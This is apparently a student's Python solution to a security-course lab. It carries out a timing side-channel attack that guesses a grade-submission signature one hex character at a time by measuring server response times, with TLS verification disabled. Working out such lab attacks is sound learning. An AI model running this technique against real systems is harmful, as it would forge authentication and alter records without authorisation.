import requests as r
from numpy import argmax
import time
import urllib3
from requests_futures.sessions import FuturesSession


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
chars = 'abcdef1234567890'
url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"

def rtt(sig:str, samples=1) -> float:
    session = FuturesSession()
    times = []
    ans = "---"
    full_urls = [r.Request('GET', url, params={
            "name" : "Paul",
            "grade" : 5,
            "signature" : sig
            }).prepare().url] * samples
    future_resps = [session.get(u, verify=False) for u in full_urls]
    resps = [resp.result() for resp in future_resps]
    times = [res.elapsed.total_seconds() for res in resps]
    ans = resps[0].text.strip()
    avgtime = round(sum(times)/samples, 3)
    print(f"sig: {sig} time: {avgtime}")
    return (avgtime, False if ans == '0' else True)

if __name__ == '__main__':
    # signature: 6823ea50b133c58cba36
    # time: 0.6456826666666667
    prev = ''
    found = False
    data_file = 'real_b2_times'
    data = []
    try:
        with open(data_file, 'r') as f:
            data = [line for line in f]
            prev = data[-1].split(":")[-1].strip()
    except FileNotFoundError:
        print('previous data file not found')
    i = len(prev)
    while not found:
        resps = [ rtt(prev + c, samples=5) for c in chars ]
        unzipped = list(zip(*resps))
        times, status = unzipped[0], unzipped[1]
        found = True in status
        prev += chars[argmax(times)]
        avg = round(max(times), 3)
        print(avg)
        data.append(f'{i}:{avg}:{prev}\n')
        i += 1
        with open(data_file, 'w') as f:
            [f.write(line) for line in data]
